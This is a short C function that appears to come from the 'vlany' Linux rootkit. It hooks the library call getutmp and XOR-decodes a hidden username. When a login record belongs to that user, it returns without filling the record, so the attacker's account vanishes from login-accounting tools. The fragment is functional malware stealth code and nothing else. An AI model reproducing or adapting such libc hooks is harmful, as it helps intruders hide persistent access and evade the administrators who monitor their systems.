void getutmp(struct utmpx *utx, struct utmp *ut)
{
    #ifdef DEBUG
        printf("[vlany] getutmp() called\n");
    #endif

    if(utx && utx->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(utx->ut_user, vlany_user)) { CLEAN(vlany_user); return; }
        CLEAN(vlany_user);
    }

    HOOK(old_getutmp, CGETUTMP);
    old_getutmp(utx, ut);
}
